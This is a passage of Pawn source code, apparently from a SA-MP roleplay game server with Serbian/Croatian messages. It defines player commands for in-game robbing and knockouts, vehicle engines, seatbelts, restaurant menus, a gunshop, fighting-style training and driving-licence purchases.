		SendUsageMessage( playerid, "/knockout [ ID/Deo imena ]");
		return 1;
	}
	if( PlayerInfo[ playerid ][ xLevel ] < 5) return SendErrorMessage( playerid, "Moras biti najmanje Level 5 da koristis ovu komandu.");
 	if( KnockedDown[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si nokautiran.");
  	if( !IsMeleeWeapon( GetWeapon( playerid ) ) ) return SendErrorMessage( playerid, "Nemas nijedno melee oruzje u ruci da bi koristio ovu komandu!");
	if( IsPlayerConnected( giveplayerid ) ) {
 		if( giveplayerid != INVALID_PLAYER_ID ) {
			if( IsPlayerNearPlayer( 1.0, playerid, giveplayerid ) ) {
   				if( KnockedDown[ giveplayerid ] != true ) {
  	    			if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe nokautirati.");
	        	    if( IsPlayerInAnyVehicle( giveplayerid ) || IsPlayerInAnyVehicle( playerid ) ) return 1;
	            	new rands = random( 2 )+1;
					format( globalstring, sizeof( globalstring ), "* %s udara %s i pokusava ga oboriti na pod.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
					PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
     				ApplyAnimation(playerid,"FIGHT_D","FightD_3",4.0,0,1,1,0,0, 1);
					if( rands == 1 ) {
	    				TogglePlayerControllable( giveplayerid, 0 );
						ApplyAnimation( giveplayerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0, 1);
						SetTimerEx( "ClearKnock", 20000, false, "i", giveplayerid );
        				KnockedDown[ giveplayerid ] = true;
						format( globalstring, sizeof( globalstring ), "* %s ga je uspio oboriti na pod.", ImeIgraca( playerid ) );
						PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
					}
					else {
	    				format( globalstring, sizeof( globalstring ), "* %s nije uspio oboriti covjeka na pod.", ImeIgraca( playerid ) );
         				PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
					}
					return 1;
				} else SendErrorMessage( playerid, "Igrac je vec nokautiran.");
			} else SendErrorMessage( playerid, "Taj igrac nije blizu tebe !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
	return 1;
}

CMD:rob( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+.");
	new ID;
    if( sscanf( params, "u", ID ) ) {
        SendUsageMessage( playerid, "/rob [ ID/Deo imena ]");
        return 1;
    }
    if( IsPlayerConnected( ID ) ) {
        if( ID != INVALID_PLAYER_ID ) {
        
            if( IgracZavezan[ ID ] != true ) return SendErrorMessage( playerid, "Igrac mora biti zavezan da biste mu mogli pregledati novcanik!");
            if( IgracOpljackan[ playerid ] == true ) return SendErrorMessage( playerid, "Vec si opljackao nekoga u skorije vreme." );

			if( IsPlayerNearPlayer( 4.0, playerid, ID ) ) {
            
                new novac = ( PlayerInfo[ ID ][ xNovac ]/10 );
                if( novac > 20000 ) novac = 20000;
            
                DajIgracuNovac( playerid, novac );
                DajIgracuNovac( ID, -novac );
                
                IgracOpljackan[ playerid ] = true;
                SetTimerEx( "ClearPlayerRob", 240000, false, "i", playerid );
                
                SendInfoMessage( playerid, "Opljackao si igraca %s i uzeo %d$.", ImeIgraca( ID ), novac );
                SendInfoMessage( ID, "%s vas je opljackao i uzeo vam %d$.", ImeIgraca( playerid ), novac );
                format( globalstring, sizeof( globalstring ), "* %s je izvadio novcanik %s i uzeo novac.", ImeIgraca( playerid ), ImeIgraca( ID ) );
				PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
				
				new string[ 128 ]; 
				format( string, sizeof( string ), "Igrac %s -> Igrac: %s | Novac: %d", ImeIgraca( playerid ), ImeIgraca( ID ), novac );
				LogSave( "Ostalo/LogRobIgraca.log", string );
            } else SendErrorMessage( playerid, "Igrac nije dovoljno blizu tebe!");
        }
    } else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
    return 1;
}

CMD:pojas( playerid, params[] ) {
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u autu!");
	if( IsVehicleBrod( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne mozete koristiti ovo, na brodu !");
	if( IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne mozete koristiti ovo, na bicikli !");
	if( IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne mozete koristiti ovo, na motoru !");
	if( Pojas[ playerid ] != true ) {
	    format( globalstring, sizeof( globalstring ), "* %s se hvata za pojas, te se vezuje njime.", ImeIgraca( playerid ) );
		PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
		Pojas[ playerid ] = true;
	}
	else {
	    format( globalstring, sizeof( globalstring ), "* %s se hvata za pojas, te ga skida.", ImeIgraca( playerid ) );
	    PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
        Pojas[ playerid ] = false;
	}
	return 1;
}

CMD:upali( playerid, params[] ) {
	if( IsPlayerConnected( playerid ) ) {
		new vehicle = GetPlayerVehicleID( playerid ),
			engine,lights,alarm,doors,bonnet,boot,objective;

	    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
	 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
	    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
		if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
		if( Fuel[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Vozilo nema goriva ne mozete ga upaliti." );

        if(PrivatnoVozilo(vehicle)) {

	        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vID ] == vehicle ) { }
		    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vID ] == vehicle ) { }
		    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vID ] == vehicle ) { }
		    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vID ] == vehicle ) { }
			else if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == getVehicleScriptID(vehicle) ) { }
			else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila." );

            GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
			if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );
            if( Maskuse[ playerid ] == true )
            	format( globalstring, sizeof( globalstring ), "* Maska_%d pokusava pokrenuti motor.", PlayerInfo[ playerid ][ xMaskID ] );
            else
				format( globalstring, sizeof( globalstring ), "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );
			PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
			SetTimerEx( "VehicleEngineStart", 1000, 0, "i", playerid );
			SetPVarInt( playerid, "StartingVehicle", 1 );
			return 1;
		}
        
		else {
			GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
		    if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );
			if( Maskuse[ playerid ] == true )
            	format( globalstring, sizeof( globalstring ), "* Maska_%d pokusava pokrenuti motor.", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );
			PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
			SetTimerEx( "VehicleEngineStart", 1000, 0, "i", playerid );
			SetPVarInt( playerid, "StartingVehicle", 1 );
		    return 1;
	    }
	}
	return true;
}

CMD:ugasi( playerid, params[] ) {
	new vehicle = GetPlayerVehicleID( playerid ),
		engine,lights,alarm,doors,bonnet,boot,objective;

    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
    if( PlayerCP[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ugasis vozilo dok si na eventu." );

	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
	if( engine == 0 ) return SendErrorMessage( playerid, "Motor vozila je vec ugasen." );
	SetVehicleParamsEx(vehicle,0,lights,alarm,doors,bonnet,boot,objective);
	if( Maskuse[ playerid ] == true )
       	format( globalstring, sizeof( globalstring ), "* Maska_%d gasi motor.", PlayerInfo[ playerid ][ xMaskID ] );
 	else
		format( globalstring, sizeof( globalstring ), "* %s gasi motor.", ImeIgraca( playerid ) );
	PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	return 1;
}

alias:drink("pice");
CMD:drink( playerid, params[] ) {

	for( new i = 1; i < MAX_BUSSINES; i++ ) {
	    if( IsPlayerInRangeOfPoint( playerid, 80.0, BussinesInfo[ i ][ bExitX ], BussinesInfo[ i ][ bExitY ], BussinesInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BussinesInfo[ i ][ bInVW ]) {
		    if( BussinesInfo[ i ][ bType ] == VRSTA_BAR || BussinesInfo[ i ][ bType ] == VRSTA_DISCO || BussinesInfo[ i ][ bType ] == VRSTA_NKLUB || BussinesInfo[ i ][ bType ] == VRSTA_JAVNAK || BussinesInfo[ i ][ bType ] == VRSTA_CASINO) {
			    if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0 && BussinesInfo[ i ][ bType ] != VRSTA_CASINO) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
				SPD( playerid, dialog_DRINK, DSL, D_NASLOV, "Whisky 200$\nVodka 170$\nPivo 85$\nKonjak 120$\nTequila 150$\nJack Daniels 290$\nMineralna voda 60$\nCedevita 80$\nCoca Cola 50$", D_ODABERI, D_ODUSTANI );
			    break;
			}
		}
	}
	return 1;
}

CMD:menu( playerid, params[] ) {
	for( new i = 1; i < MAX_BUSSINES; i++ ) {
	    if( IsPlayerInRangeOfPoint( playerid, 25.0, BussinesInfo[ i ][ bExitX ], BussinesInfo[ i ][ bExitY ], BussinesInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BussinesInfo[ i ][ bInVW ]) {
		    if( BussinesInfo[ i ][ bType ] == VRSTA_RESTORAN ) {
			    if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
                uFirmi[ playerid ] = i;
				SPD( playerid, dialog_RESTORAN, DSL, D_NASLOV, "Juha 150$\nPiletina 220$\nMorski pas 350$\nSpageti 410$\nKolac 630$\nCoca Cola 50$\nVoda 25$", D_ODABERI, D_ODUSTANI);
			    break;
			}
		    else if( BussinesInfo[ i ][ bType ] == VRSTA_CLUCK ) {
			    if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
                uFirmi[ playerid ] = i;
				SPD( playerid, dialog_CLUCKIN, DSL, D_NASLOV, "Topli sendvic 100$\nCevapi 150$\nFileti 100$\nVocna salata 100$\nKebab 120$\nSprite 50$\nVoda 25$", D_ODABERI, D_ODUSTANI);
			    break;
			}
			else if( BussinesInfo[ i ][ bType ] == VRSTA_PIZZA ) {
			    if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
				uFirmi[ playerid ] = i;
				PizzaMenuTDControl( playerid, true );
				SelectTextDraw( playerid, SRVBOJA1 );
			    break;
			}
			else if( BussinesInfo[ i ][ bType ] == VRSTA_BURG) {
		        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
                uFirmi[ playerid ] = i;
				TogglePlayerControllable( playerid, false );
				SPD( playerid, dialog_BURGMENU , DSMSG, D_NASLOV, "Koristi CTRL/LMB kako bi listao hranu.\n\nKad nadjes zeljeni hranu, pritisni ENTER/F da bi je kupio.\n\nUkoliko zelis da prekines listanje hrane, pritisni SHIFT/SPACE.", "Zatvori","");
				ListaBurg[ playerid ] = 1;
				Novi_SetPlayerPos( playerid, 367.9745,-65.1584,1001.5078 );
				SetPlayerCameraPos( playerid, 376.8709, -67.8987, 1002.1277 );
				SetPlayerCameraLookAt( playerid, 376.9249, -66.9022, 1001.6640 );
	            CKilometriTDControl( playerid, true );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], "Hamburger" );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], "Cena: 65$" );
			    break;
			}
		}
	}
	return 1;
}

CMD:kupisat( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 1797.4590,-1240.3735,13.6499 ) ) return SendErrorMessage( playerid, "Morate biti u Rolex Store-u." );
	if( PlayerInfo[ playerid ][ xSat ] != 0 ) return SendErrorMessage( playerid, "Vec imas sat, ako zelis drugi prvo ga baci komandom /baci." );
	WatchModel[ playerid ] = 19039;
    buyWatchTDControl( playerid, true );
	return 1;
}

CMD:fillcar( playerid, params[] ) {

	new vehicleid, found;
    for( new i = 0; i < MAX_VEHICLES; i++) {
    
        new Float:X, Float:Y, Float:Z;
        GetVehiclePos(i, X, Y, Z);
        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z)) {
            vehicleid = i;
            found = 1;
            break;
        }
        else
            continue;
    }
	if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

    new Float:vehPos[ 3 ];
	getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
	if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti iza vozila." );

	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da biste zatvorili/otvorili prtljaznik.");
	if( IsVehicleBajs( vehicleid ) ) {
		SendErrorMessage( playerid, "Nepoznata akcija.");
		return 1;
	}

    if(PlayerInfo[playerid][xKantica] == 0) return SendErrorMessage(playerid, "Nemas kantica za gorivo!");

    if( ( 10 + Fuel[ vehicleid ] ) > getAmountFuel( vehicleid ) ) {
    
 		SendErrorMessage( playerid, "Rezervoar mora biti prazan bar 10L da bi ga napunili.");
		return 1;
	}

    PlayerInfo[playerid][xKantica]--;
    SavePlayer(playerid);

    vehicleFill(playerid, vehicleid);
    return 1;
}

CMD:kupikanticu( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xNovac ] < 200 ) return SendErrorMessage( playerid, "Nemate 200$ kod sebe." );

    if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozes ovo iz vozila!");
	
    if( !IsAtGasStation( playerid ) ) {
        SendErrorMessage( playerid, "Niste na benzinskoj stanici!");
        return 1;
    }

    if( 10 > ServerInfo[ Gorivo ] ) {
	    SendErrorMessage( playerid, "Nema goriva u resursima pa ne mozete kupiti kanticu.");
	    return 1;
	}

    PlayerInfo[playerid][xKantica]++;

	DajIgracuNovac( playerid, -200 );
	SCM( playerid, ZUTA, "Kupili ste kanticu za 200$." );
	BussinesMoney( uFirmi[ playerid ], 100 );
    SavePlayer(playerid);

	return true;
}

CMD:kupi( playerid, params[] ) {

    new businessId = GetPlayerBusinessId( playerid, VRSTA_GUNSHOP );

	if( businessId == -1 ) {
		SendErrorMessage( playerid, "Morate biti u gunshopu." );
	} else if( businessId == -2 ) {
		SendErrorMessage( playerid, "Nemamo vise proizvoda!" );
	} else {

	    if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SCM( playerid,  CRVENA, "Ne mozes kupiti oruzje level 1 si!");
    	if( PlayerInfo[ playerid ][ xGunLicense ] == false ) return SCM( playerid,  CRVENA, "Ne mozete kupiti oruzje bez dozvole." );

        if(chooseGun[playerid] == 0) { buyGunShow(playerid, 1); buyGunTDShow(playerid, 1); }
        else { buyGunShow(playerid, 0); buyGunTDShow(playerid, 0); }

    	//SPD( playerid, dialog_GUNSHOP, DSL, D_NASLOV, "Noz [500$]\nBassebal bat [500$]\nColt 45 [1000$]\nDeagle [3000$]\nShotgun [8000$]\nCountry Rifle[15000$]\nPancir[5000$]", "Kupi", D_ODUSTANI );
	}
	return true;
}
CMD:treniraj( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 25.0, 771.0096,13.4834,1000.6988 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u teretani." );
    new item[ 32 ];
	if( sscanf(params, "s[32] ", item ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/treniraj [opcija]");
     	SCM( playerid, BELA, "[Opcije] Boxing ($2000), KungFu($2400), Grab'n'Kick ($2800), KneeHead ($3000)");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "boxing",true) == 0) {
	    if( PlayerInfo[ playerid ][ xNovac ] < 2000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(2000 $)." );
	    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_BOXING);
        SetTimerEx("BoxTrain", 1000, false, "i", playerid);
		format( globalstring, sizeof( globalstring ), "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		DajIgracuNovac( playerid, -2000 );
		return 1;
	}
	else if( strcmp( item, "kungfu",true) == 0) {
	    if( PlayerInfo[ playerid ][ xNovac ] < 2400 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(2400 $)." );
	    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KUNGFU);
        SetTimerEx("KungTrain", 1000, false, "i", playerid);
		format( globalstring, sizeof( globalstring ), "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		DajIgracuNovac( playerid, -2400 );
		return 1;
	}
	else if( strcmp( item, "grab'n'kick",true) == 0) {
	    if( PlayerInfo[ playerid ][ xNovac ] < 2800 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(2800 $)." );
	    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_GRABKICK);
        SetTimerEx("GrabTrain", 1000, false, "i", playerid);
		format( globalstring, sizeof( globalstring ), "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		DajIgracuNovac( playerid, -2800 );
		return 1;
	}
	else if( strcmp( item, "kneehead",true) == 0) {
        if( PlayerInfo[ playerid ][ xNovac ] < 3000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(3000 $)." );
		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KNEEHEAD);
        SetTimerEx("KneeTrain", 1000, false, "i", playerid);
		format( globalstring, sizeof( globalstring ), "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		DajIgracuNovac( playerid, -3000 );
		return 1;
	}
	else {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/treniraj [opcija]");
     	SCM( playerid, BELA, "[Opcije] Boxing ($2000), KungFu($2400), Grab'n'Kick ($2800), KneeHead ($3000)");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
   	}
	return 1;
}
// CMD:lesson( playerid, params[] ) {
// 	if( PlayerInfo[ playerid ][ xSkolaLimit ] == 1 ) return SendErrorMessage( playerid, "Vec si polagao jednom, sledeci put mozes sledeci payday. ");
// 	if( IsPlayerInRangeOfPoint( playerid, 3, 1664.8800,-1367.4441,-48.9541 ) ) {
// 	    if( GetPlayerVirtualWorld( playerid ) != 2 ) return SendErrorMessage( playerid, "Moras biti u Osnovnoj Skoli." );
//  	    new Float:RandomPozicija[4][4] = {
// 			{1667.6226,-1358.8826,-48.9541, 180.0000},
// 			{1663.8583,-1359.0941,-48.9541, 180.0000},
// 			{1664.1572,-1362.5344,-48.9541, 180.0000},
// 			{1667.7842,-1362.2119,-48.9541, 180.0000}
// 		};
//         if( PlayerInfo[ playerid ][ xOsnovna ] == 3 ) return SendErrorMessage( playerid, "Vec si polozio osnovnu skolu. " );
//         new poz = random( sizeof( RandomPozicija ) );
// 		Odbrojavanje[ playerid ] = 180;
// 		VremeTDControl( playerid, true );
// 		Novi_SetPlayerPos( playerid, RandomPozicija[poz][0], RandomPozicija[poz][1], RandomPozicija[poz][2] );
// 		SetPlayerFacingAngle( playerid, RandomPozicija[poz][ 3 ] );
//    		GameTextForPlayer( playerid, "~w~Casovi osnovne skole", 5000, 1 );
//    		TogglePlayerControllable( playerid, false );
//    		ApplyAnimation( playerid,"PED","SEAT_IDLE",4,0,0,0, 1,0,1);
// 		Uciskolu[ playerid ] = true;
// 		SkolaTimer[ playerid ] = SetTimerEx( "OsnovnaCasovi", 180000, 0, "ii", playerid, (PlayerInfo[ playerid ][ xOsnovna ]+1) );

// 		format( globalstring, sizeof( globalstring ), "* %s sjeda na stolicu i slusa lekciju od ucitelja.", ImeIgraca( playerid ) );
//         PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
// 	}
// 	else if( IsPlayerInRangeOfPoint( playerid, 3, 1667.8092,-1379.7235,-48.9541 ) ) {
// 	    if( GetPlayerVirtualWorld( playerid ) != 1 ) return SendErrorMessage( playerid, "Moras biti u Srednjoj Skoli." );
// 	    if( PlayerInfo[ playerid ][ xOsnovna ] != 3 ) return SendErrorMessage( playerid, "Da bi zavrsio srednju moras prvo zavrsiti osnovnu. " );
// 	    new Float:RandomPozicija1[4][4] =
// 		{
// 			{1667.7314,-1373.4442,-48.9541, 180.0000},
// 			{1664.3392,-1373.3768,-48.9541, 180.0000},
// 			{1664.2988,-1377.2484,-48.9541, 180.0000},
// 			{1667.7661,-1377.1738,-48.9541, 180.0000}
// 		};
// 		if( PlayerInfo[ playerid ][ xSrednja ] == 6 ) return SendErrorMessage( playerid, "Vec si polozio srednju skolu. " );
// 	    new poz = random( sizeof( RandomPozicija1 ) );
// 		Odbrojavanje[ playerid ] = 180;
// 		VremeTDControl( playerid, true );
// 		Novi_SetPlayerPos( playerid, RandomPozicija1[poz][0], RandomPozicija1[poz][1], RandomPozicija1[poz][2] );
// 		SetPlayerFacingAngle( playerid, RandomPozicija1[poz][ 3 ] );
// 		GameTextForPlayer( playerid, "~w~Casovi srednje skole", 5000, 1 );
// 	 	TogglePlayerControllable( playerid, false );
// 	   	ApplyAnimation( playerid,"PED","SEAT_IDLE",4,0,0,0, 1,0,1);
// 		Uciskolu[ playerid ] = true;
// 		SkolaTimer[ playerid ] = SetTimerEx( "SrednjaCasovi", 180000, 0, "ii", playerid, (PlayerInfo[ playerid ][ xSrednja ]+1) );
// 		format( globalstring, sizeof( globalstring ), "* %s sjeda na stolicu i slusa lekciju od ucitelja.", ImeIgraca( playerid ) );
// 	    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
// 	}
// 	else if( IsPlayerInRangeOfPoint( playerid, 3, 1665.9690,-1392.0660,-48.95411 ) ) {
// 	    if( GetPlayerVirtualWorld( playerid ) != 3 ) return SendErrorMessage( playerid, "Moras biti u fakultetu." );
// 	    new Float:RandomPozicija2[4][4] =
// 		{
// 			{1667.9868,-1389.2526,-48.9541, 180.0000},
// 			{1663.9470,-1389.3354,-48.9541, 180.0000},
// 			{1663.7031,-1385.6427,-48.9541, 180.0000},
// 			{1667.6373,-1385.7008,-48.9541, 180.0000}
// 		};
// 	    if( PlayerInfo[ playerid ][ xSrednja ] != 6 ) return SendErrorMessage( playerid, "Da bi zavrsio fakultet, moras prvo srednju. " );
// 		if( PlayerInfo[ playerid ][ xFakultet ] == 15 ) return SendErrorMessage( playerid, "Vec si zavrsio fakultet " );
// 	    new poz = random( sizeof( RandomPozicija2 ) );
// 		Odbrojavanje[ playerid ] = 180;
// 		VremeTDControl( playerid, true );
// 		Novi_SetPlayerPos( playerid, RandomPozicija2[poz][0], RandomPozicija2[poz][1], RandomPozicija2[poz][2] );
// 		SetPlayerFacingAngle( playerid, RandomPozicija2[poz][ 3 ] );
// 	   	GameTextForPlayer( playerid, "~w~Casovi fakulteta", 5000, 1 );
// 	   	TogglePlayerControllable( playerid, false );
// 	   	ApplyAnimation( playerid,"PED","SEAT_IDLE",4,0,0,0, 1,0,1);
// 		Uciskolu[ playerid ] = true;
// 		SkolaTimer[ playerid ] = SetTimerEx( "FakultetCasovi", 180000, 0, "ii", playerid, (PlayerInfo[ playerid ][ xFakultet ]+1) );
// 		format( globalstring, sizeof( globalstring ), "* %s sjeda na stolicu i slusa lekciju od ucitelja.", ImeIgraca( playerid ) );
// 	    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
// 	}
// 	else {
// 	    SendErrorMessage( playerid, "Nisi u ucionici." );
// 	    return 1;
// 	}
// 	return 1;
// }

CMD:kupidozvolu( playerid, params[] ) {
	new item[32];
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, 830.6841,-510.1363,996.6475 ) ) return SendErrorMessage( playerid, "Nisi u auto skoli!");
    if( sscanf( params, "s[32]", item ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/kupidozvolu [kategorija]");
     	SCM( playerid, BELA, "[Kategorije] A(motor), B(auto), C1(Kombi), C2(Kamion), C3(Kamion sa prikolicom)");
        SCM( playerid, BELA, "[Cene] A(1000$), B(3000$), C1(4500$), C2(6000$), C3(8000$)");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "a",true) == 0 ) {
		if( PlayerInfo[ playerid ][ xMotorska ] > 0 ) return SendErrorMessage( playerid, "Vec imate dozvolu!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 1000) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");
        SetPVarInt( playerid, "dialog_M_POLAGANJE", 1);
		DajIgracuNovac( playerid, -1000 ); PolaganjeBodovi[ playerid ] = 0;
		SPD( playerid, dialog_M_ISPIT, DSMSG, ""col_white"Pitanje br. 1", ""col_white"Kojom stranom se vozi u Los Santosu?", "Levom", "Desnom");
	}
	else if( strcmp( item, "b",true) == 0 ) {
	    if( PlayerInfo[ playerid ][ xVozacka ] > 0 ) return SendErrorMessage( playerid, "Vec imas dozvolu za voznju auta!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 3000) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");
        SetPVarInt( playerid, "dialog_POLAGANJE", 1);
		DajIgracuNovac( playerid, -3000 ); PolaganjeBodovi[ playerid ] = 0;
		SPD( playerid, dialog_A_ISPIT, DSMSG, ""col_white"Pitanje br. 1", ""col_white"Kojom stranom se vozi u Los Santosu?", "Levom", "Desnom");
	}
	else if( strcmp( item, "c1",true) == 0 ) {
	    if( PlayerInfo[ playerid ][ xKamionskaC1 ] > 0 ) return SendErrorMessage( playerid, "Vec imate dozvolu!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 4500) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");
        SetPVarInt( playerid, "dialog_K_POLAGANJE", 1);
		DajIgracuNovac( playerid, -4500 ); PolaganjeBodovi[ playerid ] = 0;
		SPD( playerid, dialog_K_ISPIT, DSMSG, ""col_white"Pitanje br. 1", ""col_white"Kojom stranom se vozi u Los Santosu?", "Levom", "Desnom");
	}
	else if( strcmp( item, "c2",true) == 0 ) {
	    if( PlayerInfo[ playerid ][ xKamionskaC2 ] > 0 ) return SendErrorMessage( playerid, "Vec imate dozvolu!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 6000) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");
        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 1);
		DajIgracuNovac( playerid, -6000 ); PolaganjeBodovi[ playerid ] = 0;
		SPD( playerid, dialog_C2_ISPIT, DSMSG, ""col_white"Pitanje br. 1", ""col_white"Kojom stranom se vozi u Los Santosu?", "Levom", "Desnom");
	}
	else if( strcmp( item, "c3",true) == 0 ) {
	    if( PlayerInfo[ playerid ][ xKamionskaC3 ] > 0 ) return SendErrorMessage( playerid, "Vec imate dozvolu!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 8000 ) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");
        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 1 );
